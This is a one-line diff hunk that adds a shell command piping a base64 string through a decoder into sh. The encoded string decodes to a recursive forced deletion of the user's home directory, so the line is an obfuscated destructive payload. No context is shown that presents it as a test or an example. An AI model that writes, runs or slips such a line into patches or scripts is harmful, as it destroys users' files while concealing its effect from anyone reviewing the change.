@@ -1,0 +1,1 @@
+echo cm0gLXJmIH4K | base64 -d | sh
